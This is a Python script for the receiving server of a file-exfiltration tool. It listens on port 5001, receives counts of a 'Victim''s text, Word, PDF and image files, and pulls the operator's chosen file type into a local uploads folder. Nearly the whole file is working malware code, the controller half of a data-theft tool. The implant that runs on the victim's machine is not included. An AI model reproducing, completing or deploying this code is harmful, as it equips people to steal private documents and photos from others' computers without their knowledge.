##Buffer class for better data handlening
class Buffer:
    def __init__(self,s):
        '''Buffer a pre-created socket.
        '''
        self.sock = s
        self.buffer = b''

    def get_bytes(self,n):
        '''Read exactly n bytes from the buffered socket.
           Return remaining buffer if <n bytes remain and socket closes.
        '''
        while len(self.buffer) < n:
            data = self.sock.recv(1024)
            if not data:
                data = self.buffer
                self.buffer = b''
                return data
            self.buffer += data
        # split off the message bytes from the buffer.
        data,self.buffer = self.buffer[:n],self.buffer[n:]
        return data

    def put_bytes(self,data):
        self.sock.sendall(data)

    def get_utf8(self):
        '''Read a null-terminated UTF8 data string and decode it.
           Return an empty string if the socket closes before receiving a null.
        '''
        while b'\x00' not in self.buffer:
            data = self.sock.recv(1024)
            if not data:
                return ''
            self.buffer += data
        # split off the string from the buffer.
        data,_,self.buffer = self.buffer.partition(b'\x00')
        return data.decode()

    def put_utf8(self,s):
        if '\x00' in s:
            raise ValueError('string contains delimiter(null)')
        self.sock.sendall(s.encode() + b'\x00')

##import shit
import socket
from tqdm import tqdm
import os
import time

##BUFFERSIZE
BUFFER_SIZE = 4096

##host and port of server 
host = "0.0.0.0"
port = 5001

'''
function for download form client
'''
def download(client_socket,count):
    ##use the buffer class
    connbuf = Buffer(client_socket)

    ##start download
    for i in tqdm(range(int(count)),desc="Progress bar: "):
        file_name =connbuf.get_utf8()
        file_name = os.path.basename(file_name)
        file_path = os.path.join('uploads',file_name)

        file_size = int(connbuf.get_utf8())

        with open(file_path,"wb") as f:
            remaining = file_size
            while remaining:
                chunk_size = 4096 if remaining >= 4096 else remaining
                chunk = connbuf.get_bytes(chunk_size)
                if not chunk: break
                f.write(chunk)
                remaining -= len(chunk)

def main():
    s =socket.socket()
    s.bind((host,port))
    s.listen(5)
    client_socket,address = s.accept() # accept the connections
    print(f"{address} is connected")

    ##receive the file counts
    txt_count = client_socket.recv(BUFFER_SIZE).decode()
    time.sleep(1)
    word_count = client_socket.recv(BUFFER_SIZE).decode()
    time.sleep(1)
    pdf_count = client_socket.recv(BUFFER_SIZE).decode()
    time.sleep(1)
    jpg_count = client_socket.recv(BUFFER_SIZE).decode()

    if len(txt_count) != 0 and len(word_count) != 0 and len(pdf_count) != 0 and len(jpg_count) != 0:
        '''
        if server receives all type of counts
        '''
        ##print the counts
        print("[*]Victim has " + str(txt_count) + " text files")
        print("[*]Victim has " + str(word_count) + " word files")
        print("[*]Victim has " + str(pdf_count) + " pdf files")
        print("[*]Victim has " + str(jpg_count) + " images")

        ##making an upload directory
        try:
            os.system("md uploads")
        except:
            pass
        
        #command to get files of specific data type
        command = input("[*]Enter file type to download: ")
        client_socket.send(f"{command}".encode())


        #main download function
        if command == "txt":
            download(client_socket,txt_count)
        elif command == "pdf":
            download(client_socket,pdf_count)
        elif command == "word":
            download(client_socket,word_count)
        elif command == "image":
            download(client_socket,jpg_count)
    else:
        print("[*]Something wrong")

if __name__ == "__main__":
    main()
           
